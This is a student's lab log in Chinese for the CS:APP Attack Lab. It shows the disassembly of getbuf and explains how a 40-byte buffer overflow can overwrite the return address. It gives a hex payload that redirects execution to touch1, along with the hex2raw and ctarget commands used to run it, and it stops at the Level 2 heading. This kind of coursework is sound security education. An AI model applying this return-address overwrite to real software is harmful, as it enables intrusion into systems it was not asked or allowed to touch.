## Lab3实验记录

简要介绍实验如下，实验要求实现缓冲区溢出攻击中的代码注入攻击和覆写返回地址攻击。

详细实验内容请见[attack lab的实验指导](http://csapp.cs.cmu.edu/3e/attacklab.pdf)。该实验指导非常非常重要，描述了整个实验的操作流程和一部分的实验原理，甚至连附录A和B都需要好好阅读。

在实验开始前我们和上一个实验bomb lab一样先通过反汇编得到`ctarget`和`rtarget`的汇编代码。

```shell
$ objdump -d ctarget > ctarget_disas.asm
$ objdump -d rtarget > rtarget_disas.asm
```



### Level 1

该level较为简单。可以看到调用`Gets`前，共分配了40字节的缓冲区大小，而这个栈空间的结构也非常简单，在40字节的缓冲区上面就是返回地址，所以我们只需输入40个字符，再接着输入函数`touch1`对应的地址覆盖掉原来的返回地址，就可以完成该level。

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

在具体操作的过程中我们可以借助附录A提供的指导，使用`hex2raw`来完成转换。

exploit.txt文件内容如下：

```assembly
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40
```

执行代码为

```shell
$ ./hex2raw < exploit.txt > exploit-raw.txt
$ ./ctarget < exploit-raw.txt -q
```



### Level 2

